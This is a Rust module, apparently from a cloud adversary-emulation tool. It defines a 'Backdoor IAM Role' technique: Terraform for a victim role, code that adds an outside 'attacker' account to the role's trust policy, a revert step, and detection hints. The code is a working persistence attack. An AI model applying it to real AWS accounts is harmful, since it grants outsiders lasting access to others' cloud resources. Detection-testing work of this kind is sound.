use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

const TERRAFORM: &str = r#"
data "aws_caller_identity" "current" {}

resource "aws_iam_role" "victim" {
  name = "stratus-red-team-${random_string.suffix.result}"
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect    = "Allow"
      Principal = { AWS = "arn:aws:iam::${data.aws_caller_identity.current.account_id}:root" }
      Action    = "sts:AssumeRole"
    }]
  })
  tags = { StratusRedTeam = "true" }
}

resource "random_string" "suffix" {
  length  = 8
  special = false
  upper   = false
}

output "role_name" {
  value = aws_iam_role.victim.name
}

output "role_arn" {
  value = aws_iam_role.victim.arn
}
"#;

const ATTACKER_ACCOUNT_ID: &str = "012345678901";

async fn detonate_impl(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> Result<()> {
    let aws = providers.aws().await?;
    let role_name = outputs.get("role_name").ok_or_else(|| anyhow::anyhow!("Missing output: role_name"))?;

    // Fetch existing trust policy
    let role = aws.iam
        .get_role()
        .role_name(role_name)
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    let existing_policy = role
        .role()
        .ok_or_else(|| anyhow::anyhow!("Role not found in response"))?
        .assume_role_policy_document()
        .ok_or_else(|| anyhow::anyhow!("No assume role policy document"))?;

    // URL-decode the policy (AWS returns it URL-encoded)
    let decoded = urlencoding_decode(existing_policy);

    // Parse existing policy to extend it
    let mut policy: serde_json::Value = serde_json::from_str(&decoded)
        .map_err(|e| anyhow::anyhow!("Failed to parse trust policy: {}", e))?;

    let attacker_principal = format!("arn:aws:iam::{}:root", ATTACKER_ACCOUNT_ID);

    let new_statement = serde_json::json!({
        "Effect": "Allow",
        "Principal": { "AWS": attacker_principal },
        "Action": "sts:AssumeRole"
    });

    if let Some(statements) = policy["Statement"].as_array_mut() {
        statements.push(new_statement);
    }

    let new_policy_str = serde_json::to_string(&policy)
        .map_err(|e| anyhow::anyhow!("Failed to serialize trust policy: {}", e))?;

    aws.iam
        .update_assume_role_policy()
        .role_name(role_name)
        .policy_document(&new_policy_str)
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    println!(
        "Backdoored trust policy of role {} to also trust attacker account {}",
        role_name, ATTACKER_ACCOUNT_ID
    );

    Ok(())
}

fn detonate(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

async fn revert_impl(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> Result<()> {
    let aws = providers.aws().await?;
    let role_name = outputs.get("role_name").ok_or_else(|| anyhow::anyhow!("Missing output: role_name"))?;

    // Get current account ID
    let identity = aws.sts
        .get_caller_identity()
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    let account_id = identity.account().ok_or_else(|| anyhow::anyhow!("Could not determine account ID"))?;

    // Rebuild original trust policy trusting only current account
    let original_policy = serde_json::json!({
        "Version": "2012-10-17",
        "Statement": [{
            "Effect": "Allow",
            "Principal": {
                "AWS": format!("arn:aws:iam::{}:root", account_id)
            },
            "Action": "sts:AssumeRole"
        }]
    });

    let policy_str = serde_json::to_string(&original_policy)
        .map_err(|e| anyhow::anyhow!("Failed to serialize trust policy: {}", e))?;

    aws.iam
        .update_assume_role_policy()
        .role_name(role_name)
        .policy_document(&policy_str)
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    println!("Restored original trust policy for role {}", role_name);

    Ok(())
}

fn revert(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> BoxFuture<Result<()>> {
    Box::pin(revert_impl(outputs, providers))
}

/// AWS URL-encodes assume-role policy documents in GetRole responses.
/// Perform a simple percent-decode.
fn urlencoding_decode(input: &str) -> String {
    let mut result = String::with_capacity(input.len());
    let bytes = input.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            if let Ok(s) = std::str::from_utf8(&bytes[i + 1..i + 3]) {
                if let Ok(b) = u8::from_str_radix(s, 16) {
                    result.push(b as char);
                    i += 3;
                    continue;
                }
            }
        }
        result.push(bytes[i] as char);
        i += 1;
    }
    result
}

inventory::submit! {
    AttackTechnique {
        id: "aws.persistence.iam-backdoor-role",
        friendly_name: "Backdoor IAM Role",
        description: "Modifies an IAM role trust policy to allow an external attacker-controlled AWS account to assume the role.",
        detection: "CloudTrail: UpdateAssumeRolePolicy. GuardDuty: Policy:IAMUser/AnomalousBehavior.",
        platform: Platform::Aws,
        mitre_tactics: &[MitreTactic::Persistence],
        is_idempotent: true,
        is_slow: false,
        prerequisite_tf: Some(TERRAFORM),
        detonate,
        revert: Some(revert),
    }
}
